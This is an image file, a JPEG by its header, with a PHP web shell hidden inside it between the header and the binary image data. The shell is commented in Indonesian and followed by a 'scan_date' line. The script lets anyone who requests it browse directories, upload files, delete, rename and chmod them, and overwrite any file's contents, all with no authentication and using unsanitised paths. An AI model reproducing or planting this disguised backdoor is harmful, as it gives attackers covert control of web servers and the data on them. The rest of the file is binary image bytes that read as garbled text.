ÿØÿà JFIF      ÿþÇ<?php
// Fungsi untuk mendapatkan daftar file di direktori tertentu
function getFiles($dir) {
    $files = [];
    // Membuka direktori
    if ($handle = opendir($dir)) {
        // Loop melalui setiap file
        while (($file = readdir($handle)) !== false) {
            // Jangan sertakan . dan ..
            if ($file != "." && $file != "..") {
                // Tambahkan file ke daftar
                $files[] = $file;
            }
        }
        closedir($handle);
    }
    return $files;
}

// Fungsi untuk mengunggah file
function uploadFile($uploadDir, $fileInputName) {
    $targetFile = $uploadDir . basename($_FILES[$fileInputName]["name"]);
    if (move_uploaded_file($_FILES[$fileInputName]["tmp_name"], $targetFile)) {
        echo "File " . htmlspecialchars(basename($_FILES[$fileInputName]["name"])) . " berhasil diunggah.";
    } else {
        echo "Maaf, ada kesalahan saat mengunggah file.";
    }
}

// Fungsi untuk menghapus file
function deleteFile($filePath) {
    if (unlink($filePath)) {
        echo "File $filePath berhasil dihapus.";
    } else {
        echo "Maaf, ada kesalahan saat menghapus file.";
    }
}

// Fungsi untuk mengubah nama file
function renameFile($oldName, $newName) {
    if (rename($oldName, $newName)) {
        echo "File berhasil diubah nama menjadi $newName.";
    } else {
        echo "Maaf, ada kesalahan saat mengubah nama file.";
    }
}

// Fungsi untuk mengubah permission file
function chmodFile($filePath, $mode) {
    if (chmod($filePath, octdec($mode))) {
        echo "Permission file $filePath berhasil diubah menjadi $mode.";
    } else {
        echo "Maaf, ada kesalahan saat mengubah permission file.";
    }
}

// Fungsi untuk mengedit file
function editFile($filePath, $newContent) {
    if (file_put_contents($filePath, $newContent) !== false) {
        echo "File $filePath berhasil diubah.";
    } else {
        echo "Maaf, ada kesalahan saat mengedit file.";
    }
}

// Mendapatkan direktori saat ini
$currentDirectory = isset($_GET['dir']) ? $_GET['dir'] : getcwd();

// Menampilkan direktori saat ini
echo "Current Directory: $currentDirectory<br><br>";

// Menampilkan file dalam direktori saat ini
$files = getFiles($currentDirectory);

// Tampilkan tombol navigasi untuk direktori di atas
$parentDirectory = dirname($currentDirectory);
echo "<a href='?dir=$parentDirectory'>ChangeDir</a><br><br>";

// Tampilkan file dalam tabel
echo "<table border='1'>";
echo "<tr><th>File Name</th><th>Actions</th></tr>";
foreach ($files as $file) {
    echo "<tr><td><a href='$file'>$file</a></td><td>";
    echo "<a href='?action=delete&file=$file'>Delete</a> | ";
    echo "<a href='?action=rename&file=$file'>Rename</a> | ";
    echo "<a href='?action=chmod&file=$file'>Chmod</a> | ";
    echo "<a href='?action=edit&file=$file'>Edit</a>"; // Tambahkan tautan untuk mengedit file
    echo "</td></tr>";
}
echo "</table>";

// Tampilkan tombol navigasi untuk direktori di bawah
foreach ($files as $file) {
    if (is_dir($currentDirectory . '/' . $file)) {
        echo "<a href='?dir=$currentDirectory/$file'>$file</a><br>";
    }
}

// Proses aksi yang diminta
if (isset($_GET['action'])) {
    switch ($_GET['action']) {
        case 'upload':
            if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                uploadFile($currentDirectory . '/', 'fileToUpload');
            } else {
                echo "
                <form action='?action=upload&dir=$currentDirectory' method='post' enctype='multipart/form-data'>
                    Select file to upload:
                    <input type='file' name='fileToUpload' id='fileToUpload'>
                    <input type='submit' value='Upload File' name='submit'>
                </form>
                ";
            }
            break;
        case 'delete':
            $fileToDelete = $_GET['file'];
            deleteFile($currentDirectory . '/' . $fileToDelete);
            break;
        case 'rename':
            if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                $oldName = $_GET['file'];
                $newName = $_POST['newName'];
                renameFile($currentDirectory . '/' . $oldName, $currentDirectory . '/' . $newName);
            } else {
                $fileToRename = $_GET['file'];
                echo "
                <form action='?action=rename&file=$fileToRename&dir=$currentDirectory' method='post'>
                    New Name: <input type='text' name='newName'>
                    <input type='submit' value='Rename'>
                </form>
                ";
            }
            break;
        case 'chmod':
            if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                $fileToChmod = $_GET['file'];
                $newMode = $_POST['newMode'];
                chmodFile($currentDirectory . '/' . $fileToChmod, $newMode);
            } else {
                $fileToChmod = $_GET['file'];
                echo "
                <form action='?action=chmod&file=$fileToChmod&dir=$currentDirectory' method='post'>
                    New Mode (Octal): <input type='text' name='newMode'>
                    <input type='submit' value='Chmod'>
                </form>
                ";
            }
            break;
        case 'edit':
            $fileToEdit = $_GET['file'];
            if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                $newContent = $_POST['newContent'];
                editFile($currentDirectory . '/' . $fileToEdit, $newContent);
            } else {
                $fileContent = file_get_contents($currentDirectory . '/' . $fileToEdit);
                echo "
                <form action='?action=edit&file=$fileToEdit&dir=$currentDirectory' method='post'>
                    New Content: <br><textarea name='newContent' rows='10' cols='50'>$fileContent</textarea><br>
                    <input type='submit' value='Edit'>
                </form>
                ";
            }
            break;
        default:
            echo "Aksi tidak valid.";
            break;
    }
}
?>
scan_date=Fri May 10 19:21:27 2024
ÿÛ C I26@6-I@;@RMIVm¶vmddmÞŸ¨„¶ÿèÿÿÿèþúÿÿÿÿÿÿÿÿúþÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÛ CMRRm_mÕvvÕÿÿþÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÀ  ì ì" ÿÄ                ÿÄ 4      !1AQ"aq2±3Rr‘¡Áb‚ð#4BÑSÿÄ               ÿÄ               ÿÚ   ? ÓP­‹aÚ Ü(ZƒP@F¯Qj@ia¨ÏZ 4Ô-FnLL
¬FZŸrã•®Rd)ZWFœeÇ%4š¦¯!/#Hè•„^¦Clk‚iÕôØHCå $åuî)ÅöeO “kfd”„öaB½†˜ ¨blvÍHÁò¿rÊˆr¢~ eUM®¯-“©‚û5ù²H£S ±ãQ‹î€ÒQIÃJ·Õ¨?»ù$ÒŽ•É	dš»tŸðþ„¸z@OtÛÉo±–žàhÔW1_“˜¾ë÷&×*EF.¦ÚõSŒ­Qwû˜dáBJ8¢Û­ˆ'ÄÆá}QÊudÉ	BJú¥W°Ô<·kØ¨ÁèÕÝÒ.q”RŠUíËÇU×"E¼mI'µŠQÓ*»õA8õEµ{znjµ$û2a)GåtjïUÎíe<rÇÏêIÙŽžWfså†‰RÝ—ì1Á+j]z€¬]AÚtÄ¾Ê69ñ|ÉþGAFsjQjÌæ“Š’üÑ˜÷Š^èŽîÐeU+îEgÔèP×áÕrŒŸüv`TeÜU—*¤$’nºŒ+9bMÚuè/ƒÞF A0‚…×P”â¾j`âß„–í9Ð’U¹	9l·îM¨ÁtØ#žxÜcm™ÑÔàò;–ÑèŒò%JŠ*2‹q{R[#Tâ÷9±ÁÉºfÑƒD.?‰U³Fk»£eQ…að%{Q¥JqÓ/+êû–0ŒãŽ1v®Ìso‘ú'6—“#®¬£^ŠÇ©¶L¶mv/+¨FóÅ\’î%RöeEâÚtÍÌç6¤]Ú°9  §¥¦¥SÇ©t04ÂüÎ=Âˆí+éÔÓáÊ.ãºî……yš|poãååt+È¾ðjÉëú€jÉê“úÀƒ÷?¨Zfú3¤@aRouHÞ—è
F3£c03‚œ[qEëÉÛö.<–:çÛö
síû F:çÛö
y;~ÆÀYÔÿ AÂ	ÉóFÆyb”äßê)»“.2QMõá”v$¿ÝkÔˆº’-I<¶ø²£q%\0×Ôv»È   ›NÐ¨C&û®]g;1KV5úbÀ Š     `!€ˆ,€Éd¸     ø—åK¹±Íâ]Í.È#HØŠ†4 Pì,@  @4txynãÜæ4Çóª"»@Q–¨Ú   Ä  Oº àÌ¹>†vÜ    †8òKTÛ:sKLrÎ6T¤Á©E@  €    L`ÀEÁÔ—¹DP–™¸¾±Ï>Œ×õFº¢4°  j]v®è&¬À™ Œz±êC   „ä»ŽÀºAfr•º\ 3Ìí[ês³lÏtŒye‰Bä`€¨0 À¤(v+*$"(è‘BÞØˆKLËÆüˆ‰ª•÷#N˜ÉJ6†sb›‹ô:/°—ö¡Ø›} +Ñ0òýÖ-k®Á­w*—ú‚ãýBÔ»¡j]ÐÝìŸê{†¥î	°Ip‡dØ›¤œ©mÉšà¶VYÉŠ;EƒÝ°5¦©!ì@U ¤+t‚‘6@  ŠmÒÆ.N‘y„tG¯%*„L[s—¸â~QÏx‹†Æe¦K“ly:w1’©~àQQÓadBz–ü” ÅC	 ¢€  (“±Éô%n@ {!Š[ªî”S›T\=,s«\še@      2”]RR¶k¥cKÔmÒ2ËjîN>[ìL»4‚¨{°çò+¡+yYk‚,g5kØŽ‰™ÉS¢7n«G?£+éÓà£p    e*^¬r–”em¿R;¢*C
Õ /›òFNS]M"íY•ú1c•:îi“”w´K‹\ª5*/£ÝÏ@tK_Ê< 1t¨Æù%»vÁ»`På—DhsÉÜ›µåHÁ„ –å®	EJH‰+F„µDV=iò+îi(õ\™•ãÉÒF–»œÑämÖÀt
SHË¢ ›o~G@—WÉHŠ(E=‘ ê0êËxÈÍ:fµå‘‰¦]tãw€¸¾Œm&©™– 2ž77DQÒCÇû € Êê>æ%åw/c0:::@#ÉB"†Äøv‚¤‰Çª4hDõÝþÁ5LEE+ªêZUîU»åŒ€)*†>)ðH   /”ç:Êsše®'³F†XŸ˜Ô §è €D%Ñ–bn“c"jRƒÓ4¹`bÝ±,Y#)BI.¤¸MEIÅ¥.pt˜ü©[Ç*5É\c).éQê2wŒ’”d›áW%5(«”$—vEL‚/p“¡5(«”$—v€²Z¡Ûuä–ümÈ·n”dåÚ·2+‰0VÍ”®¡'NžÂ„%½BOzà4‚¤ªá%ùÍu¢wì wrŒ¢»´+tž‰Sãn@RäA+ŽòŒ•÷@í:i§ê@ nÚI6ßD)\v”d›â× Ràæ|:gÿ Î¡‚„æÚŒkŸCH1üèÜÅFPÈ¢âÔ»5%W	o²Ø ¥u¢Wì-õiÓ-]¨©jj·äŽP-ÐÖñ2~fF˜ø)¿p5ËçSÇÞDÃÃ_ù°NZ|f5÷¢ÑrJ3Â»7ô`e?±x©)ÉéÒ©z•…êÃ‘ãêå¤¨Ûñ‹‡–“ºÛjÛy8c5™|KÚ.­ÙXdå“2“´¥Iøm³rþ^¬Ók.fÓKP«äGfo<rcë¦ÑÆ¾Eþu:¤ëÆÅw…~ä‹Q9i‡‡—e¿µ¸ü9äÊúÅø”¢±Ç¢µûY?ôoªVT?ôá…ó9;ýÉMÇÆ8¦ô·uÓ‚îŽÉ;Ú«¿øÅ%^6«ÿ @™¶üJZ)-ºpl¾Þ_…}YŒÿ åt~†ËíåøWÕÊr|gÕÕõC_cƒû~‚ÄÜñeRw»[}Žíú ¼GŸûÂKøÿ Ò<OÛ/Ãü—7ˆÏÃ¯¡'í—áþIAáþÒRû±ÿ >ƒñ>háŸvƒ
GYËŽ6ö]2ðøÜoJ”jýè¢²ÊQñ’{;µÜiiÏ•¯ºŸÔYS~'IÒ»Þl¾‘_È%«Å`ŸGÿ ÏÔ¹KTq>ò_É8Ú~:Æüý‚?cáý×ÐoLò>ÑOêJWâ£5Ä T¾l¿"ðÞl8Ûæ*€æïîþ¢wÐ}_»úŒ	›¨³%›$`à¥Q}(¬¼#&Ë6IN3”¼ÑáÐKÄejŸÊíR3 7ÿ U™ÿ Þ½‘q”ÜÖê\ìºœÈè‡È€{¦šm5ÃC–L’J{>iPÜ”­¨nRsRrz—„S”§6µÊëÐ~icPszWJDŽ=J*Z¤îRm®6à›š››Ô¸t€ ·©Éê»º¹©9|GmWB|€Ó”Ó6¯–äëEkÚ<l‡.	©IMÍIê|ºå)\¥n«¹iqÕånêJz4ëzoŠBà°T³eQoâ?ÑñË’N2Þ\Þök?‘œì¨µ–kÃRòv£XNnZÝG‘Îoä@[žGw7º§²ÊpU	´»R /ÔtÿÙ